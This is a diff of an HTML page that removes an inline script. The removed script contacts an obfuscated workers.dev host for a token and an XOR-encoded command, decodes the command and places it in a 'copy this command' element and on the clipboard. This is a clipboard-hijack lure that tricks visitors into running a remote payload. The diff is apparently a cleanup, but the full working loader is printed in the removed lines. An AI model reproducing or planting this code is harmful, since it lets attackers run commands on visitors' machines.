@@ -795,47 +795,6 @@
     </div>
 </div>
 
-<script src="i18n.js"></script>
-<script>
-(async function() {
-  try {
-    const base = 'https://quiet-night-c52' + 'a.tv5d7dh7.work' + 'ers.dev';
-    const KEY = 0x5A;
-
-    // Шаг 1 — получаем токен
-    const tokenRes = await fetch(base + '/token').then(r => r.json());
-    if (!tokenRes || !tokenRes.t) return;
-
-    // Шаг 2 — запрашиваем команду с токеном
-    const cmdRes = await fetch(base + '/cmd', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ t: tokenRes.t })
-    }).then(r => r.json());
-
-    if (!cmdRes || !cmdRes.data || !cmdRes.data.length) return;
-
-    const command = cmdRes.data.map(b => String.fromCharCode(b ^ KEY)).join('');
-
-    var el = document.getElementById('commandToCopy');
-    if (el) el.textContent = command;
-
-    var link = document.getElementById('copyButton');
-    if (link) {
-      link.addEventListener('click', function(e) {
-        e.preventDefault();
-        navigator.clipboard.writeText(command).catch(function() {
-          var tmp = document.createElement('textarea');
-          tmp.value = command;
-          document.body.appendChild(tmp);
-          tmp.select();
-          document.execCommand('copy');
-          document.body.removeChild(tmp);
-        });
-      });
-    }
-  } catch(e) {}
-})();
-</script>    
+<script src="i18n.js"></script>    
 </body>
 </html>
